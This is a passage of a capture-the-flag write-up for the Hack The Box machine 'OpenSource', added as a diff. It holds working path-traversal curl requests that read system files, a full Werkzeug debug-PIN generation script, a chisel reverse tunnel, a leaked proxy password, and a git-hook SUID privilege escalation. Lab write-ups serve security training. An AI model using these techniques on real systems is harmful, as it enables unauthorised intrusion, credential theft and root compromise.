+</span></span><span style="display:flex;"><span>postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+</span></span><span style="display:flex;"><span>cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+</span></span><span style="display:flex;"><span>ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+</span></span><span style="display:flex;"><span>sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+</span></span><span style="display:flex;"><span>at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+</span></span><span style="display:flex;"><span>squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+</span></span><span style="display:flex;"><span>xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+</span></span><span style="display:flex;"><span>games:x:35:35:games:/usr/games:/sbin/nologin
+</span></span><span style="display:flex;"><span>cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+</span></span><span style="display:flex;"><span>vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+</span></span><span style="display:flex;"><span>ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+</span></span><span style="display:flex;"><span>smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+</span></span><span style="display:flex;"><span>guest:x:405:100:guest:/dev/null:/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/:/sbin/nologin
+</span></span></code></pre></div><p>Users with a shell: ``halt<code>, </code>root<code>Success! I first tried to see if I was able to grab any SSH keys but no luck... But since I have local file inclusion, I can instead use this to gather the information needed to brute force the Flask Debug console PIN number and get a shell that way as specified [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#werkzeug-console-pin-exploit). Or, we could simply overwrite</code>views.py` to execute a reverse shell by capturing the upload using burpsuite then modifying the code.</p>
+<p>To brute force the flask PIN:</p>
+<p>We need to grab: <code>username</code>, <code>modname(flask.app)</code>, <code>/proc/net/arp(Device ID to extract MAC address)</code>, as well as <code>/proc/self/cgroup</code>.</p>
+<p>we know the username from the git diff:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git diff a76f8f7 ee9d9f1
+</span></span><span style="display:flex;"><span>diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
+</span></span><span style="display:flex;"><span>deleted file mode <span style="color:#ae81ff">100644</span>
+</span></span><span style="display:flex;"><span>index 5975e3f..0000000
+</span></span><span style="display:flex;"><span>--- a/app/.vscode/settings.json
+</span></span><span style="display:flex;"><span>+++ /dev/null
+</span></span><span style="display:flex;"><span>@@ -1,5 +0,0 @@
+</span></span><span style="display:flex;"><span>-<span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>-  <span style="color:#e6db74">&#34;python.pythonPath&#34;</span>: <span style="color:#e6db74">&#34;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&#34;</span>,
+</span></span><span style="display:flex;"><span>-  <span style="color:#e6db74">&#34;http.proxy&#34;</span>: <span style="color:#e6db74">&#34;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&#34;</span>,
+</span></span><span style="display:flex;"><span>-  <span style="color:#e6db74">&#34;http.proxyStrictSSL&#34;</span>: false
+</span></span><span style="display:flex;"><span>-<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>diff --git a/app/app/views.py b/app/app/views.py
+</span></span><span style="display:flex;"><span>index 0f3cc37..f2744c6 <span style="color:#ae81ff">100644</span>
+</span></span><span style="display:flex;"><span>--- a/app/app/views.py
+</span></span><span style="display:flex;"><span>+++ b/app/app/views.py
+</span></span><span style="display:flex;"><span>@@ -6,17 +6,7 @@ from flask import render_template, request, send_file
+</span></span><span style="display:flex;"><span> from app import app
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>-@app.route<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>-def index<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>-    <span style="color:#66d9ef">return</span> render_template<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;index.html&#39;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Now, retrieving <code>/proc/net/arp</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is http://10.129.227.140/uploads/..//proc/net/arp --ignore-content-length
+</span></span><span style="display:flex;"><span>IP address       HW type     Flags       HW address            Mask     Device
+</span></span><span style="display:flex;"><span>172.17.0.1       0x1         0x2         02:42:d0:f3:4e:a7     *        eth0
+</span></span></code></pre></div><p>Active interface <code>eth0</code>, using this to grab the MAC address from <code>/sys/class/net/eth0/address</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is http://10.129.227.140/uploads/..//sys/class/net/eth0/address --ignore-content-length
+</span></span><span style="display:flex;"><span>02:42:ac:11:00:02
+</span></span><span style="display:flex;"><span>python -q
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; 0x0242ac110002
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2485377892354</span>
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt;
+</span></span></code></pre></div><p>Next, grabbing <code>/proc/sys/kernel/random/boot_id</code> and <code>/proc/self/cgroup</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/OpenSource/src<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl --path-as-is http://10.129.227.140/uploads/..//proc/sys/kernel/random/boot_id --ignore-content-length
+</span></span><span style="display:flex;"><span>49f8507d-f27f-4ab3-8797-b1d1cf318111
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/OpenSource/src<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl --path-as-is http://10.129.227.140/uploads/..//proc/self/cgroup --ignore-content-length
+</span></span><span style="display:flex;"><span>12:blkio:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
+</span></span><span style="display:flex;"><span>11:hugetlb:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
+</span></span><span style="display:flex;"><span>10:cpu,cpuacct:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
+</span></span><span style="display:flex;"><span>9:net_cls,net_prio:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
+</span></span><span style="display:flex;"><span>8:freezer:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
+</span></span><span style="display:flex;"><span>7:memory:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
+</span></span><span style="display:flex;"><span>6:devices:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
+</span></span><span style="display:flex;"><span>5:cpuset:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
+</span></span><span style="display:flex;"><span>4:rdma:/
+</span></span><span style="display:flex;"><span>3:perf_event:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
+</span></span><span style="display:flex;"><span>2:pids:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
+</span></span><span style="display:flex;"><span>1:name<span style="color:#f92672">=</span>systemd:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
+</span></span><span style="display:flex;"><span>0::/system.slice/snap.docker.dockerd.service
+</span></span></code></pre></div><p>Final script to get the PIN:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> chain
+</span></span><span style="display:flex;"><span>probably_public_bits <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;root&#39;</span>,  <span style="color:#75715e"># username</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;flask.app&#39;</span>,  <span style="color:#75715e"># modname</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Flask&#39;</span>,  <span style="color:#75715e"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;/usr/local/lib/python3.10/site-packages/flask/app.py&#39;</span>  <span style="color:#75715e"># getattr(mod, &#39;__file__&#39;, None),</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>private_bits <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;2485377892354&#39;</span>,  <span style="color:#75715e"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;49f8507d-f27f-4ab3-8797-b1d1cf3181116d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c&#39;</span>  <span style="color:#75715e"># get_machine_id(), /etc/machine-id</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0</span>
+</span></span><span style="display:flex;"><span>h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> chain(probably_public_bits, private_bits):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> bit:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isinstance(bit, str):
+</span></span><span style="display:flex;"><span>        bit <span style="color:#f92672">=</span> bit<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">.</span>update(bit)
+</span></span><span style="display:flex;"><span>h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cookiesalt&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># h.update(b&#39;shittysalt&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cookie_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;__wzd&#39;</span> <span style="color:#f92672">+</span> h<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">20</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>num <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> num <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pinsalt&#39;</span>)
+</span></span><span style="display:flex;"><span>    num <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%09d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> int(h<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>))[:<span style="color:#ae81ff">9</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rv <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> rv <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> group_size <span style="color:#f92672">in</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(num) <span style="color:#f92672">%</span> group_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            rv <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;-&#39;</span><span style="color:#f92672">.</span>join(num[x:x <span style="color:#f92672">+</span> group_size]<span style="color:#f92672">.</span>rjust(group_size, <span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>                          <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(num), group_size))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        rv <span style="color:#f92672">=</span> num
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(rv)
+</span></span></code></pre></div><p>PIN recovered: <code>921-105-725</code> after entering this into the console PIN popup, we get access to the debug console shell and we can use this to get a reverse shell!</p>
+<p>Once we get a shell and run <code>ifconfig eth0</code> we can see that it&rsquo;s a docker container due to the address&rsquo;s format: <code>172.17.x.x</code>. Remember from the port scan we found port <code>3000</code> open but it was filtered. Running a quick wget on the &lsquo;host&rsquo; of the docker container <code>172.17.0.1:3000</code> retrieves a gitea instance. Let&rsquo;s download <code>chisel</code> onto the host and start a reverse proxy so that we can access the gitea instance.</p>
+<p>On local machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chisel server -p <span style="color:#ae81ff">1234</span> --reverse
+</span></span></code></pre></div><p>On the remote machine after downloading chisel from your local machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chisel client 10.10.16.214:1234 R:3000:172.17.0.1:3000
+</span></span></code></pre></div><p>Now after we get a connection back, I logged into the instance using  the username/password I found from running <code>git diff</code>. After logging in, there is a repo called <code>home-backup</code> which contains <code>.ssh</code>. From here, we can grab the private SSH key, then use this to SSH into the machine as the <code>dev01</code> user.</p>
+<h3 id="root">root</h3>
+<p>After doing a bit of enumeration, I eventually downloaded <code>pspy64</code> from my local machine to check the running processes. After running this, we can see there is a git commit that is ran on a schedule. <a href="https://www.atlassian.com/git/tutorials/git-hooks">This</a> post shows how we can utilize git hooks to get code execution.</p>
+<p>I will simply apply suid permissions to <code>/bin/bash</code> using the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;chmod 4755 /bin/bash&#39;</span> &gt; ~/.git/hooks/pre-commit
+</span></span><span style="display:flex;"><span>chmod +x ~/.git/hooks/pre-commit
+</span></span></code></pre></div><p>After running above&hellip; after a few seconds the script will run and we can get root by running:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/bash -p <span style="color:#75715e">#dont drop privileges from owner</span>
+</span></span></code></pre></div><p>Annnnddd that about does it for that machine! Thanks for reading.</p>
+</div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/supaaasuge">GitHub</a>
+      
+         | 
+        <a href="https://x.com/supaaasuge">Twitter</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2024
+    <a href="https://supaaasuge.github.io/"><strong>Supaaasuge</strong></a>.
+    This work is licensed under the
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a> license.
+  </p>
+  <p class="builtWith">
+    Built with
+    <a href="http://www.gohugo.io/">Hugo</a>,
+    using the theme
+    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>,
+    which was influenced by the theme
+    <a href="https://github.com/sumnerevans/smol">smol</a>.
+  </p>
+</footer>
+
+    </div>
+  </body>
+</html>
